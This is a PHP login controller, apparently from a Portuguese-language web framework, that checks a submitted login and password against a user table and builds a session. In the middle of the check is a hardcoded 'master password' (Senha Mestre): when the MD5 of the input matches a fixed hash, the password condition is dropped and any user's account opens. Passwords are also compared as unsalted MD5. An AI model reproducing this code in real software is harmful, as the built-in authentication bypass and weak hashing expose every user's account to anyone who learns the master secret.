<?php
	if (isset($_GET["controller"])){
		if ($_GET["controller"] == "autentica"){
			$login = tdc::r("login");
			$senha = tdc::r("senha");

			if (($login!="") and ($senha!="")){
				$sqlCriterio1 = tdClass::Criar("sqlcriterio");
				$sqlCriterio2 = tdClass::Criar("sqlcriterio");
								
				$sqlCriterio1->add(tdClass::Criar("sqlfiltro",array("login",'=',$login)));
				if (md5($senha) != "bf4d9a9fd8ca63472939edad14a91a8d"){ # Senha Mestre
					$sqlCriterio1->add(tdClass::Criar("sqlfiltro",array("senha",'=',md5($senha))));
				}
				$sqlCriterio2->add(tdClass::Criar("sqlfiltro",array("perfilusuario",'<>',1)));
				$sqlCriterio2->add(tdClass::Criar("sqlfiltro",array("perfilusuario",'is',null)),OU);
				
				$sql = tdClass::Criar("sqlcriterio");
				$sql->add($sqlCriterio1);
				$sql->add($sqlCriterio2);
				$dataset = tdClass::Criar("repositorio",array(USUARIO))->carregar($sql);
				if ($dataset){
					$session = new stdClass;
					$session->autenticado 		= true;
					$session->userid 			= $dataset[0]->id;
					$session->username	 		= $dataset[0]->nome;
					$session->empresa			= 1;
					
					$session->permitirexclusao			= ($dataset[0]->permitirexclusao==""?0:$dataset[0]->permitirexclusao);
					$session->permitirtrocarempresa		= ($dataset[0]->permitirtrocarempresa==""?0:$dataset[0]->permitirtrocarempresa);
					$session->usergroup 				=  $dataset[0]->td_grupousuario;
					Session::set($session);

					$retorno = array(
						"error_code" => 0,
						"error_msg" => ""
					);
				}else{
					$retorno = array(
						"error_code" => 1,
						"error_msg" => "Usu&aacute;rio ou Senha n&atilde;o conferem."
					);
				}
			}else{
				$retorno = array(
					"error_code" => 2,
					"error_msg" => "Campos Login e/ou Senha n&atilde;o podem estar em branco"
				);
			}
			echo json_encode($retorno);
			exit;
		}
	}
	if (!Session::get()->autenticado){
		include PATH_MVC_VIEW . 'autentica.php';
	}